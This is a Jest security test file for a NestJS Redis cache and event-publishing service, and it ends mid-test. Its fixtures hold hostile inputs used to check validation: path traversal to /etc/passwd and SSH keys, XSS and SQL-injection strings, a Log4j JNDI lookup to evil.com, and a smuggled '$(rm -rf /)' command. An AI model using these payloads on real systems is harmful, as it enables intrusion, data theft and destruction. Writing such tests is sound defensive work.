// test/security/cache-events.security.spec.ts
import { Test, TestingModule } from '@nestjs/testing';
import { ConfigModule, ConfigService } from '@nestjs/config';
import { HttpModule, HttpService } from '@nestjs/axios';
import { CacheModule } from '../../src/cache/cache.module';
import { EventsModule } from '../../src/events/events.module';
import { CacheService } from '../../src/cache/cache.service';
import { EventsService } from '../../src/events/events.service';
import { CacheUtils } from '../../src/cache/cache-keys.constants';
import Redis from 'ioredis';
import { of, throwError } from 'rxjs';

describe('Cache and Events Security Tests', () => {
  let module: TestingModule;
  let cacheService: CacheService;
  let eventsService: EventsService;
  let redis: Redis;
  let httpService: jest.Mocked<HttpService>;

  const securityTestConfig = {
    NODE_ENV: 'test',
    REDIS_HOST: 'localhost',
    REDIS_PORT: '6379', 
    REDIS_DB: '13', // Separate DB for security tests
    REDIS_KEY_PREFIX: 'security-test',
    EVENT_TRANSPORT: 'http',
    ORCHESTRATION_SERVICE_URL: 'http://localhost:3336',
    INTERNAL_SERVICE_TOKEN: 'security-test-token',
  };

  beforeAll(async () => {
    const mockHttpService = {
      post: jest.fn(),
      get: jest.fn(),
    };

    module = await Test.createTestingModule({
      imports: [
        ConfigModule.forRoot({
          isGlobal: true,
          load: [() => securityTestConfig],
        }),
        CacheModule,
        EventsModule,
      ],
    })
    .overrideProvider(HttpService)
    .useValue(mockHttpService)
    .compile();

    cacheService = module.get<CacheService>(CacheService);
    eventsService = module.get<EventsService>(EventsService);
    httpService = module.get(HttpService);

    // Setup Redis for direct validation
    redis = new Redis({
      host: securityTestConfig.REDIS_HOST,
      port: parseInt(securityTestConfig.REDIS_PORT),
      db: parseInt(securityTestConfig.REDIS_DB),
    });

    // Initialize services
    httpService.get.mockReturnValue(of({ status: 200, data: { status: 'healthy' } } as any));
    await eventsService.onModuleInit();
  });

  afterAll(async () => {
    await redis.flushdb();
    await redis.quit();
    await module.close();
  });

  beforeEach(async () => {
    await redis.flushdb();
    jest.clearAllMocks();
    httpService.post.mockReturnValue(of({ status: 200, data: { received: true } } as any));
  });

  describe('Cache Security', () => {
    describe('Data Isolation', () => {
      it('should prevent access to other users\' cache data', async () => {
        const user1 = 'user-111';
        const user2 = 'user-222';
        
        // User 1 data
        const user1Project = { id: 'p1', ownerId: user1, secret: 'user1-secret' };
        await cacheService.set(cacheService.getProjectKey('p1'), user1Project);
        await cacheService.set(cacheService.getProjectListKey(user1, 1, 10), [user1Project]);
        
        // User 2 data  
        const user2Project = { id: 'p2', ownerId: user2, secret: 'user2-secret' };
        await cacheService.set(cacheService.getProjectKey('p2'), user2Project);
        await cacheService.set(cacheService.getProjectListKey(user2, 1, 10), [user2Project]);

        // Verify isolation: User 1 cannot access User 2's list key
        const user1List = await cacheService.get(cacheService.getProjectListKey(user1, 1, 10));
        expect(user1List).toEqual([user1Project]);
        expect(user1List[0].secret).toBe('user1-secret');
        expect(user1List[0].secret).not.toBe('user2-secret');

        // User 2's data should be completely separate
        const user2List = await cacheService.get(cacheService.getProjectListKey(user2, 1, 10));
        expect(user2List).toEqual([user2Project]);
        expect(user2List[0].secret).toBe('user2-secret');

        // Cross-user invalidation should not affect other users
        await cacheService.invalidateUserProjectsCache(user1);
        
        // User 1's cache should be gone
        expect(await cacheService.get(cacheService.getProjectListKey(user1, 1, 10))).toBeNull();
        
        // User 2's cache should remain
        expect(await cacheService.get(cacheService.getProjectListKey(user2, 1, 10))).not.toBeNull();
      });

      it('should prevent key injection attacks', async () => {
        const maliciousKeys = [
          '../../../etc/passwd',
          'user:123:*', // Pattern injection
          'projects:project:*', // Wildcard injection
          'security-test:projects:project:123', // Prefix injection
          'user\ninjected', // Newline injection
          'user\x00null', // Null byte injection
        ];

        for (const maliciousKey of maliciousKeys) {
          // Should reject malicious keys
          const setResult = await cacheService.set(maliciousKey, 'malicious-data');
          expect(setResult).toBe(false);
          
          const getResult = await cacheService.get(maliciousKey);
          expect(getResult).toBeNull();
        }

        // Verify no malicious data was stored
        const allKeys = await redis.keys('*');
        const hasMaliciousKeys = allKeys.some(key => 
          key.includes('..') || key.includes('*') || key.includes('\n') || key.includes('\x00')
        );
        expect(hasMaliciousKeys).toBe(false);
      });

      it('should sanitize cache patterns for safe Redis operations', async () => {
        // Setup legitimate data
        await cacheService.set('projects:project:safe-123', { id: 'safe' });
        await cacheService.set('projects:project:safe-456', { id: 'safe' });
        
        // Try malicious patterns
        const maliciousPatterns = [
          '*', // Too broad
          'projects:*:*:*', // Too many wildcards
          '../*', // Path traversal attempt
          'projects:project:*; DROP TABLE projects;', // SQL injection attempt
        ];

        for (const maliciousPattern of maliciousPatterns) {
          const keys = await cacheService.keys(maliciousPattern);
          // Should return empty array or only safe keys
          expect(keys.every(key => key.startsWith('projects:project:safe-'))).toBe(true);
        }
      });
    });

    describe('Lock Security', () => {
      it('should prevent unauthorized lock releases', async () => {
        const operation = 'secure-operation';
        const resourceId = 'secure-resource';

        // User A acquires lock
        const lockValueA = await cacheService.acquireLock(operation, resourceId);
        expect(lockValueA).toBeTruthy();

        // User B tries to release with wrong value
        const maliciousRelease1 = await cacheService.releaseLock(operation, resourceId, 'fake-value');
        expect(maliciousRelease1).toBe(false);

        // User B tries to guess lock value format
        const maliciousRelease2 = await cacheService.releaseLock(operation, resourceId, '1234-1234567890-abc123');
        expect(maliciousRelease2).toBe(false);

        // Lock should still be held by User A
        const stillLocked = await cacheService.isLocked(operation, resourceId);
        expect(stillLocked).toBe(true);

        // Only User A can release with correct value
        const legitimateRelease = await cacheService.releaseLock(operation, resourceId, lockValueA!);
        expect(legitimateRelease).toBe(true);
      });

      it('should generate cryptographically unique lock values', async () => {
        const lockValues = [];
        
        // Generate multiple lock values
        for (let i = 0; i < 100; i++) {
          const lockValue = await cacheService.acquireLock(`test-op-${i}`, `resource-${i}`);
          expect(lockValue).toBeTruthy();
          lockValues.push(lockValue);
        }

        // All values should be unique
        const uniqueValues = new Set(lockValues);
        expect(uniqueValues.size).toBe(100);

        // Values should contain process ID and timestamp for traceability
        lockValues.forEach(value => {
          expect(value).toMatch(/^\d+-\d+-[a-z0-9]+$/);
          const parts = value!.split('-');
          expect(parts[0]).toMatch(/^\d+$/); // PID
          expect(parts[1]).toMatch(/^\d+$/); // Timestamp
          expect(parts[2]).toMatch(/^[a-z0-9]+$/); // Random part
        });
      });

      it('should handle lock bombing attempts', async () => {
        const operation = 'bombed-operation';
        
        // Try to create many locks for different resources rapidly
        const lockPromises = [];
        for (let i = 0; i < 100; i++) {
          lockPromises.push(cacheService.acquireLock(operation, `resource-${i}`, 1));
        }

        const lockResults = await Promise.all(lockPromises);
        
        // All should succeed (different resources)
        expect(lockResults.every(result => result !== null)).toBe(true);

        // Wait for expiration
        await new Promise(resolve => setTimeout(resolve, 1500));

        // All locks should be expired
        for (let i = 0; i < 100; i++) {
          const isLocked = await cacheService.isLocked(operation, `resource-${i}`);
          expect(isLocked).toBe(false);
        }
      });
    });

    describe('Token Security', () => {
      it('should hash tokens for cache keys securely', () => {
        const tokens = [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
          'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...',
          'malicious-token-with-injection-attempt',
        ];

        const hashedKeys = tokens.map(token => cacheService.getTokenValidationKey(token));

        // All keys should be properly formatted
        hashedKeys.forEach(key => {
          expect(key).toMatch(/^auth:token:[a-f0-9]{16}$/);
          expect(key).not.toContain('.'); // No JWT parts visible
          expect(key).not.toContain('Bearer'); // No Bearer prefix
          expect(key).not.toContain('injection'); // No malicious content
        });

        // Different tokens should produce different hashes
        expect(new Set(hashedKeys).size).toBe(tokens.length);
      });

      it('should handle token validation cache poisoning attempts', async () => {
        const legitimateToken = 'valid-jwt-token-123';
        const maliciousToken = 'malicious-token-456';

        // Store legitimate validation
        const legitimateValidation = { valid: true, userId: 'user-123', roles: ['user'] };
        await cacheService.set(
          cacheService.getTokenValidationKey(legitimateToken),
          legitimateValidation
        );

        // Attempt to poison cache with malicious data
        const maliciousValidation = { valid: true, userId: 'admin', roles: ['admin', 'superuser'] };
        
        // This should work for different token
        await cacheService.set(
          cacheService.getTokenValidationKey(maliciousToken),
          maliciousValidation
        );

        // Verify isolation
        const retrievedLegitimate = await cacheService.get(
          cacheService.getTokenValidationKey(legitimateToken)
        );
        expect(retrievedLegitimate).toEqual(legitimateValidation);
        expect(retrievedLegitimate.roles).toEqual(['user']); // Not affected by malicious data

        const retrievedMalicious = await cacheService.get(
          cacheService.getTokenValidationKey(maliciousToken)
        );
        expect(retrievedMalicious).toEqual(maliciousValidation);

        // Different tokens should have different cache keys
        const legitKey = cacheService.getTokenValidationKey(legitimateToken);
        const maliciousKey = cacheService.getTokenValidationKey(maliciousToken);
        expect(legitKey).not.toBe(maliciousKey);
      });
    });
  });

  describe('Events Security', () => {
    describe('Authentication and Authorization', () => {
      beforeEach(async () => {
        await eventsService.onModuleInit();
      });

      it('should include proper authentication headers', async () => {
        await eventsService.publishProjectCreated({
          projectId: 'security-test-project',
          ownerId: 'security-user',
          name: 'Security Test',
          description: 'Testing event security',
          initialPrompt: 'Test security measures',
          uploadedFileIds: [],
          hasUploadedFiles: false,
          promptComplexity: 'low',
          createdAt: new Date(),
        });

        expect(httpService.post).toHaveBeenCalledWith(
          expect.any(String),
          expect.any(Object),
          expect.objectContaining({
            headers: expect.objectContaining({
              'X-Service-Token': 'security-test-token',
              'Content-Type': 'application/json',
            }),
          })
        );
      });

      it('should validate service token configuration', async () => {
        const configService = module.get<ConfigService>(ConfigService);
        
        // Test with missing token
        jest.spyOn(configService, 'get').mockImplementation((key: string) => {
          if (key === 'INTERNAL_SERVICE_TOKEN') return undefined;
          return securityTestConfig[key];
        });

        await eventsService.onModuleInit();
        await eventsService.publishProjectCreated({
          projectId: 'no-token-test',
          ownerId: 'user',
          name: 'No Token Test',
          description: 'Test missing token',
          initialPrompt: 'Test',
          uploadedFileIds: [],
          hasUploadedFiles: false,
          promptComplexity: 'low',
          createdAt: new Date(),
        });

        // Should use fallback 'dev-token'
        expect(httpService.post).toHaveBeenCalledWith(
          expect.any(String),
          expect.any(Object),
          expect.objectContaining({
            headers: expect.objectContaining({
              'X-Service-Token': 'dev-token',
            }),
          })
        );

        jest.restoreAllMocks();
      });

      it('should handle correlation ID injection attempts', async () => {
        const maliciousCorrelationIds = [
          'normal-id<script>alert("xss")</script>',
          'id-with\nnewlines\rand\ttabs',
          'id-with-null\x00bytes',
          '../../../etc/passwd',
          'very-long-correlation-id-' + 'x'.repeat(1000),
        ];

        for (const maliciousId of maliciousCorrelationIds) {
          await eventsService.publishProjectCreated({
            projectId: 'injection-test',
            ownerId: 'user',
            name: 'Injection Test',
            description: 'Testing correlation ID injection',
            initialPrompt: 'Test',
            uploadedFileIds: [],
            hasUploadedFiles: false,
            promptComplexity: 'low',
            createdAt: new Date(),
          }, maliciousId);

          // Should include the correlation ID as-is in headers (it's the receiver's responsibility to validate)
          expect(httpService.post).toHaveBeenCalledWith(
            expect.any(String),
            expect.any(Object),
            expect.objectContaining({
              headers: expect.objectContaining({
                'X-Correlation-ID': maliciousId,
              }),
            })
          );
        }
      });
    });

    describe('Payload Security', () => {
      it('should handle malicious payloads safely', async () => {
        const maliciousProject = {
          projectId: '<script>alert("xss")</script>',
          ownerId: 'user-123',
          name: 'Project"; DROP TABLE projects; --',
          description: '${jndi:ldap://evil.com/evil}', // Log4j style injection
          initialPrompt: 'Normal prompt',
          uploadedFileIds: ['../../../etc/passwd', '$(rm -rf /)'],
          hasUploadedFiles: true,
          promptComplexity: 'low',
          createdAt: new Date(),
        };

        // Service should not sanitize - that's the receiver's responsibility
        // But should handle serialization safely
        await eventsService.publishProjectCreated(maliciousProject);

        expect(httpService.post).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            payload: expect.objectContaining({
              projectId: maliciousProject.projectId,
              name: maliciousProject.name,
              description: maliciousProject.description,
              uploadedFileIds: maliciousProject.uploadedFileIds,
            }),
          }),
          expect.any(Object)
        );

        // JSON serialization should have escaped special characters safely
        const call = httpService.post.mock.calls[0];
        const serialized = JSON.stringify(call[1]);
        expect(serialized).toContain('\\"'); // Quotes should be escaped
        expect(serialized).not.toContain('<script>'); // HTML should be safe in JSON
      });

      it('should handle oversized payloads', async () => {
        const oversizedProject = {
          projectId: 'oversized-test',
          ownerId: 'user-123',
          name: 'x'.repeat(10000), // Very long name
          description: 'y'.repeat(100000), // Very long description  
          initialPrompt: 'z'.repeat(1000000), // 1MB prompt
          uploadedFileIds: Array.from({ length: 1000 }, (_, i) => `file-${i}`), // Many files
          hasUploadedFiles: true,
          promptComplexity: 'extreme',
          createdAt: new Date(),
        };

        // Should handle large payloads without crashing
        await eventsService.publishProjectCreated(oversizedProject);

        expect(httpService.post).toHaveBeenCalled();
        
        const call = httpService.post.mock.calls[0];
        const payloadSize = JSON.stringify(call[1]).length;
        console.log(`Oversized payload size: ${payloadSize} bytes`);
        
        // Should complete successfully
        expect(payloadSize).toBeGreaterThan(1000000); // > 1MB
      });

      it('should validate UUID formats in events', async () => {
        const invalidUUIDs = [
          'not-a-uuid',
          '123-456-789', // Wrong format
          '01234567-89ab-cdef-0123-456789abcdef-extra', // Too long
          '01234567-89ab-cdef-0123-456789abcdeg', // Invalid hex
          '', // Empty
          null,
          undefined,
        ];

        for (const invalidUUID of invalidUUIDs) {
          try {
            await eventsService.publishProjectCreated({
              projectId: invalidUUID as string,
              ownerId: 'user-123',
              name: 'Invalid UUID Test',
              description: 'Testing invalid UUIDs',
              initialPrompt: 'Test',
              uploadedFileIds: [],
              hasUploadedFiles: false,
              promptComplexity: 'low',
              createdAt: new Date(),
            });
          } catch (error) {
            // Some invalid UUIDs might cause immediate failures, which is OK
          }
        }

        // All calls should have been made (validation is receiver's responsibility)
        expect(httpService.post).toHaveBeenCalledTimes(invalidUUIDs.length);
      });
    });

    describe('Network Security', () => {
      it('should handle malicious HTTP responses', async () => {
        // Mock malicious responses
        const maliciousResponses = [
          { status: 200, data: { evil: '<script>alert("xss")</script>' } },
          { status: 200, data: '../../../etc/passwd' },
          { status: 200, data: null },
          { status: 200, data: { received: true, redirect: 'http://evil.com' } },
        ];

        for (const response of maliciousResponses) {
          httpService.post.mockReturnValueOnce(of(response as any));
          
          // Should handle malicious responses without crashing
          await expect(eventsService.publishProjectCreated({
            projectId: 'malicious-response-test',
            ownerId: 'user',
            name: 'Test',
            description: 'Test malicious responses',
            initialPrompt: 'Test',
            uploadedFileIds: [],
            hasUploadedFiles: false,
            promptComplexity: 'low',
            createdAt: new Date(),
          })).resolves.toBeUndefined();
        }
      });

      it('should prevent URL injection in orchestrator configuration', async () => {
        const configService = module.get<ConfigService>(ConfigService);
        
        const maliciousURLs = [
          'http://evil.com/steal-data',
          'file:///etc/passwd',
          'javascript:alert("xss")',
          'http://localhost:3336/../../admin',
          'http://admin:password@localhost:3336/events',
        ];

        for (const maliciousURL of maliciousURLs) {
          jest.spyOn(configService, 'get').mockImplementation((key: string) => {
            if (key === 'ORCHESTRATION_SERVICE_URL') return maliciousURL;
            return securityTestConfig[key];
          });

          await eventsService.onModuleInit();

          try {
            await eventsService.publishProjectCreated({
              projectId: 'url-injection-test',
              ownerId: 'user',
              name: 'URL Injection Test',
              description: 'Testing URL injection',
              initialPrompt: 'Test',
              uploadedFileIds: [],
              hasUploadedFiles: false,
              promptComplexity: 'low',
              createdAt: new Date(),
            });
          } catch (error) {
            // Expected to fail for malicious URLs
          }

          // Verify the malicious URL was used in the call
          if (httpService.post.mock.calls.length > 0) {
            const lastCall = httpService.post.mock.calls[httpService.post.mock.calls.length - 1];
            expect(lastCall[0]).toContain(maliciousURL.split('://')[1]?.split('/')[0] || '');
          }
        }

        jest.restoreAllMocks();
      });
    });
  });

  describe('Distributed Security', () => {
    describe('Cross-Service Security', () => {
      it('should maintain security boundaries between services', async () => {
        // Simulate multiple services trying to access same cache
        const serviceAData = { service: 'A', secret: 'service-A-secret' };
        const serviceBData = { service: 'B', secret: 'service-B-secret' };

        // Each service should use its own key space
        await cacheService.set('service-a:data:123', serviceAData);
        await cacheService.set('service-b:data:123', serviceBData);

        // Verify isolation
        const retrievedA = await cacheService.get('service-a:data:123');
        const retrievedB = await cacheService.get('service-b:data:123');

        expect(retrievedA).toEqual(serviceAData);
        expect(retrievedB).toEqual(serviceBData);
        expect(retrievedA).not.toEqual(retrievedB);

        // Pattern operations should respect boundaries
        const keysA = await cacheService.keys('service-a:*');
        const keysB = await cacheService.keys('service-b:*');

        expect(keysA).toContain('service-a:data:123');
        expect(keysA).not.toContain('service-b:data:123');
        expect(keysB).toContain('service-b:data:123');
        expect(keysB).not.toContain('service-a:data:123');
      });

      it('should prevent event spoofing from unauthorized sources', async () => {
        // Events should include source service identification
        await eventsService.publishProjectCreated({
          projectId: 'spoofing-test',
          ownerId: 'user',
          name: 'Spoofing Test',
          description: 'Test event spoofing protection',
          initialPrompt: 'Test',
          uploadedFileIds: [],
          hasUploadedFiles: false,
          promptComplexity: 'low',
          createdAt: new Date(),
        });

        expect(httpService.post).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            sourceService: 'project-service',
            payload: expect.objectContaining({
              eventMetadata: expect.objectContaining({
                sourceService: 'project-service',
              }),
            }),
          }),
          expect.any(Object)
        );
      });
    });

    describe('Rate Limiting and DoS Protection', () => {
      it('should handle rapid cache operations without degrading security', async () => {
        const rapidOperations = 1000;
        const startTime = Date.now();

        // Perform rapid operations
        const promises = [];
        for (let i = 0; i < rapidOperations; i++) {
          promises.push(cacheService.set(`rapid-${i}`, { index: i }, 60));
        }

        await Promise.all(promises);
        const duration = Date.now() - startTime;

        console.log(`${rapidOperations} rapid cache operations completed in ${duration}ms`);

        // Verify all operations completed
        const stats = await cacheService.getStats();
        expect(stats.operations.sets).toBeGreaterThanOrEqual(rapidOperations);

        // Key validation should have been applied to all
        const allKeys = await redis.keys('*');
        allKeys.forEach(key => {
          expect(key).toMatch(/^security-test:rapid-\d+$/);
        });
      });

      it('should handle rapid event publishing without security degradation', async () => {
        const rapidEvents = 50;
        const promises = [];

        for (let i = 0; i < rapidEvents; i++) {
          promises.push(eventsService.publishProjectCreated({
            projectId: `rapid-event-${i}`,
            ownerId: 'rapid-user',
            name: `Rapid Event ${i}`,
            description: 'Rapid event test',
            initialPrompt: 'Test rapid events',
            uploadedFileIds: [],
            hasUploadedFiles: false,
            promptComplexity: 'low',
            createdAt: new Date(),
          }));
        }

        await Promise.all(promises);

        // All events should have proper authentication
        expect(httpService.post).toHaveBeenCalledTimes(rapidEvents);

        httpService.post.mock.calls.forEach(call => {
          expect(call[2].headers['X-Service-Token']).toBe('security-test-token');
          expect(call[1].sourceService).toBe('project-service');
        });
      });
    });

    describe('Event Tampering Protection', () => {
      it('should detect event metadata tampering attempts', async () => {
        // Mock a scenario where someone tries to tamper with event metadata
        const originalCreateEvent = {
          projectId: 'tamper-test',
          ownerId: 'user-tamper',
          name: 'Tamper Test',
          description: 'Testing event tampering',
          initialPrompt: 'Test',
          uploadedFileIds: [],
          hasUploadedFiles: false,
          promptComplexity: 'low',
          createdAt: new Date(),
        };

        await eventsService.publishProjectCreated(originalCreateEvent);

        const publishedCall = httpService.post.mock.calls[0];
        const eventMetadata = publishedCall[1].payload.eventMetadata;

        // Verify immutable metadata is generated correctly
        expect(eventMetadata.sourceService).toBe('project-service');
        expect(eventMetadata.eventVersion).toBe('1.0');
        expect(eventMetadata.eventId).toMatch(/^evt_[0-9a-f-]+$/);
        
        // Timestamp should be recent
        const eventTime = new Date(eventMetadata.eventTimestamp).getTime();
        const now = Date.now();
        expect(Math.abs(eventTime - now)).toBeLessThan(5000); // Within 5 seconds
      });

      it('should maintain event ordering integrity', async () => {
        const baseTime = Date.now();
        const events = [];

        // Publish events with controlled timing
        for (let i = 0; i < 5; i++) {
          await eventsService.publishProjectCreated({
            projectId: `ordering-test-${i}`,
            ownerId: 'ordering-user',
            name: `Ordering Test ${i}`,
            description: 'Testing event ordering',
            initialPrompt: 'Test',
            uploadedFileIds: [],
            hasUploadedFiles: false,
            promptComplexity: 'low',
            createdAt: new Date(baseTime + (i * 1000)), // 1 second apart
          });

          // Small delay to ensure timestamp ordering
          await new Promise(resolve => setTimeout(resolve, 100));
        }

        // Verify timestamps are in order
        expect(httpService.post).toHaveBeenCalledTimes(5);

        const timestamps = httpService.post.mock.calls.map(call => 
          new Date(call[1].payload.eventMetadata.eventTimestamp).getTime()
        );

        for (let i = 1; i < timestamps.length; i++) {
          expect(timestamps[i]).toBeGreaterThan(timestamps[i - 1]);
        }
      });
    });
  });

  describe('Information Disclosure Prevention', () => {
    describe('Cache Information Leakage', () => {
      it('should not expose internal implementation details in errors', async () => {
        // Force Redis errors and check error messages don't leak info
        await redis.quit();

        const result = await cacheService.get('leaked-info-test');
        expect(result).toBeNull(); // Should fail gracefully

        // Reconnect
        redis = new Redis({
          host: securityTestConfig.REDIS_HOST,
          port: parseInt(securityTestConfig.REDIS_PORT),
          db: parseInt(securityTestConfig.REDIS_DB),
        });
      });

      it('should not expose Redis internal data in stats', async () => {
        const stats = await cacheService.getStats();

        // Stats should not contain sensitive Redis configuration
        const statString = JSON.stringify(stats);
        expect(statString).not.toContain('password');
        expect(statString).not.toContain('auth');
        expect(statString).not.toContain('config');
        
        // Should only contain safe operational metrics
        expect(stats).toMatchObject({
          connections: expect.any(Object),
          operations: expect.any(Object),
          performance: expect.any(Object),
          memory: expect.any(Object),
        });
      });
    });

    describe('Event Information Disclosure', () => {
      it('should not expose sensitive configuration in health checks', async () => {
        const health = await eventsService.healthCheck();

        const healthString = JSON.stringify(health);
        expect(healthString).not.toContain('security-test-token');
        expect(healthString).not.toContain('password');
        expect(healthString).not.toContain('secret');

        // Should contain only safe operational info
        expect(health).toMatchObject({
          status: expect.stringMatching(/^(healthy|unhealthy)$/),
          transport: expect.any(String),
          circuitBreakerState: expect.any(String),
          uptime: expect.any(Number),
          metrics: expect.any(Object),
        });
      });

      it('should not log sensitive data in event publishing', async () => {
        const sensitiveProject = {
          projectId: 'sensitive-test',
          ownerId: 'user-sensitive',
          name: 'Project with sensitive data',
          description: 'This project contains password: secret123 and api-key: sk-123456',
          initialPrompt: 'Create app with database connection string: postgresql://user:password@db:5432/app',
          uploadedFileIds: ['secret-config.json', 'api-keys.txt'],
          hasUploadedFiles: true,
          promptComplexity: 'high',
          createdAt: new Date(),
        };

        const logSpy = jest.spyOn(console, 'log').mockImplementation();
        const debugSpy = jest.spyOn(console, 'debug').mockImplementation();

        await eventsService.publishProjectCreated(sensitiveProject);

        // Check that sensitive data wasn't logged
        const allLogs = [...logSpy.mock.calls, ...debugSpy.mock.calls].flat().join(' ');
        expect(allLogs).not.toContain('password');
        expect(allLogs).not.toContain('secret123');
        expect(allLogs).not.toContain('sk-123456');

        logSpy.mockRestore();
        debugSpy.mockRestore();
      });
    });
  });

  describe('Input Validation Security', () => {
    describe('Cache Key Validation', () => {
      it('should validate cache keys according to security rules', () => {
        const testCases = [
          { key: 'valid-key-123', valid: true },
          { key: 'valid_key_with_underscores', valid: true },
          { key: 'valid:key:with:colons', valid: true },
          { key: 'valid-key-with-numbers-456', valid: true },
          { key: 'invalid key with spaces', valid: false },
          { key: 'invalid\nkey\nwith\nnewlines', valid: false },
          { key: 'invalid\tkey\twith\ttabs', valid: false },
          { key: 'invalid\rkey\rwith\rreturns', valid: false },
          { key: 'x'.repeat(300), valid: false }, // Too long
          { key: '', valid: false }, // Empty
          { key: 'special!@#$%^&*()', valid: false },
        ];

        testCases.forEach(({ key, valid }) => {
          const isValid = CacheUtils.validateKey(key);
          expect(isValid).toBe(valid);
        });
      });

      it('should prevent directory traversal in cache keys', () => {
        const traversalAttempts = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          './config/database.json',
          '../cache/other-service/secrets',
          '~/../../root/.ssh/id_rsa',
        ];

        traversalAttempts.forEach(maliciousKey => {
          expect(CacheUtils.validateKey(maliciousKey)).toBe(false);
        });
      });
    });

    describe('Filter Hash Security', () => {
      it('should generate secure hashes for filters', () => {
        const filters = [
          { status: ProjectStatus.ACTIVE },
          { hasFiles: true },
          { search: 'user input with special chars <>&"' },
          { createdAfter: new Date('2025-01-01') },
        ];

        const hashes = filters.map(filter => CacheUtils.hashFilters(filter));

        // All hashes should be safe hex strings
        hashes.forEach(hash => {
          expect(hash).toMatch(/^[a-f0-9]{8}$/);
          expect(hash).not.toContain('<');
          expect(hash).not.toContain('&');
          expect(hash).not.toContain('"');
        });

        // Different filters should produce different hashes
        expect(new Set(hashes).size).toBe(filters.length);
      });

      it('should handle malicious filter content safely', () => {
        const maliciousFilters = [
          { search: '<script>alert("xss")</script>' },
          { search: '"; DROP TABLE cache; --' },
          { search: '${jndi:ldap://evil.com/evil}' },
          { search: '../../../etc/passwd' },
        ];

        maliciousFilters.forEach(filter => {
          const hash = CacheUtils.hashFilters(filter);
          
          // Hash should be clean hex string
          expect(hash).toMatch(/^[a-f0-9]{8}$/);
          expect(hash).not.toContain('<script>');
          expect(hash).not.toContain('DROP TABLE');
          expect(hash).not.toContain('${jndi:');
          expect(hash).not.toContain('../');
        });
      });
    });
  });

  describe('Audit and Compliance', () => {
    describe('Operation Auditing', () => {
      it('should maintain audit trail for critical operations', async () => {
        const auditSpy = jest.spyOn((cacheService as any).logger, 'debug');
        const eventAuditSpy = jest.spyOn((eventsService as any).logger, 'log');

        // Critical cache operations
        await cacheService.acquireLock('audit-operation', 'audit-resource');
        await cacheService.invalidateProjectCache('audit-project', 'audit-user');

        // Critical event operations  
        await eventsService.publishProjectCreated({
          projectId: 'audit-project',
          ownerId: 'audit-user',
          name: 'Audit Test',
          description: 'Testing audit trail',
          initialPrompt: 'Test audit',
          uploadedFileIds: [],
          hasUploadedFiles: false,
          promptComplexity: 'low',
          createdAt: new Date(),
        });

        await eventsService.publishProjectDeleted({
          projectId: 'audit-project',
          ownerId: 'audit-user',
          previousStatus: 'ACTIVE',
          hadGeneratedFiles: false,
          fileCount: { uploaded: 0, generated: 0, total: 0 },
          deletedAt: new Date(),
        });

        // Verify audit logging occurred
        expect(auditSpy).toHaveBeenCalledWith(
          expect.stringMatching(/Lock acquired|Project cache invalidated/),
          expect.any(Object)
        );

        expect(eventAuditSpy).toHaveBeenCalledWith(
          expect.stringMatching(/published successfully/),
          expect.objectContaining({
            projectId: 'audit-project',
          })
        );

        auditSpy.mockRestore();
        eventAuditSpy.mockRestore();
      });
    });

    describe('Data Retention and Privacy', () => {
      it('should handle cache expiration for data privacy compliance', async () => {
        // Store user data with short TTL for privacy
        const sensitiveUserData = {
          userId: 'privacy-user',
          personalInfo: 'sensitive data that should expire',
          sessionToken: 'temporary-session-token',
        };

        await cacheService.set('privacy:user-data', sensitiveUserData, 5); // 5 seconds TTL

        // Verify data is initially available
        expect(await cacheService.get('privacy:user-data')).toEqual(sensitiveUserData);

        // Wait for expiration
        await new Promise(resolve => setTimeout(resolve, 6000));

        // Data should be automatically purged
        expect(await cacheService.get('privacy:user-data')).toBeNull();

        // Verify no traces remain in Redis
        const allKeys = await redis.keys('*privacy*');
        expect(allKeys).toHaveLength(0);
      });

      it('should ensure complete data removal on explicit deletion', async () => {
        const userId = 'deletion-user';
        const sensitiveData = {
          personalDetails: 'confidential information',
          preferences: { private: true },
          history: ['action1', 'action2'],
        };

        // Store data across multiple cache keys
        await cacheService.set(`user:${userId}:profile`, sensitiveData);
        await cacheService.set(`user:${userId}:session`, { active: true });
        await cacheService.set(`user:${userId}:preferences`, sensitiveData.preferences);

        // Verify data exists
        expect(await cacheService.get(`user:${userId}:profile`)).toEqual(sensitiveData);

        // Complete user data deletion
        await cacheService.invalidateUserProjectsCache(userId);
        
        // Additional cleanup for this test
        await cacheService.deleteByPattern(`user:${userId}:*`);

        // Verify all user data is gone
        const userKeys = await redis.keys(`*user:${userId}*`);
        expect(userKeys).toHaveLength(0);

        // Verify no data can be retrieved
        expect(await cacheService.get(`user:${userId}:profile`)).toBeNull();
        expect(await cacheService.get(`user:${userId}:session`)).toBeNull();
        expect(await cacheService.get(`user:${userId}:preferences`)).toBeNull();
      });
    });
  });

  describe('Configuration Security', () => {
    describe('Secure Configuration Validation', () => {
      it('should handle missing environment variables securely', async () => {
        const testModule = await Test.createTestingModule({
          imports: [
            ConfigModule.forRoot({
              isGlobal: true,
              load: [() => ({
                // Missing critical config
                NODE_ENV: 'test',
                REDIS_HOST: 'localhost',
                // REDIS_PORT missing
                // INTERNAL_SERVICE_TOKEN missing
              })],
            }),
            CacheModule,
            EventsModule,
          ],
        }).compile();

        const testCacheService = testModule.get<CacheService>(CacheService);
        const testEventsService = testModule.get<EventsService>(EventsService);

        // Should handle missing config gracefully
        const cacheHealthy = await testCacheService.healthCheck();
        // May or may not be healthy depending on Redis default port

        const eventsHealthy = await testEventsService.healthCheck();
        // May be unhealthy due to missing config, but shouldn't crash

        expect(typeof cacheHealthy).toBe('boolean');
        expect(typeof eventsHealthy.status).toBe('string');

        await testModule.close();
      });

      it('should validate Redis connection security in production-like config', async () => {
        const prodLikeConfig = {
          NODE_ENV: 'production',
          REDIS_HOST: 'localhost',
          REDIS_PORT: '6379',
          REDIS_PASSWORD: 'secure-redis-password',
          REDIS_TLS_ENABLED: 'true',
          REDIS_KEY_PREFIX: 'prod-secure',
        };

        // Note: We can't actually test TLS connection in this test environment
        // but we can verify the configuration would be applied

        const configModule = await Test.createTestingModule({
          imports: [
            ConfigModule.forRoot({
              isGlobal: true,
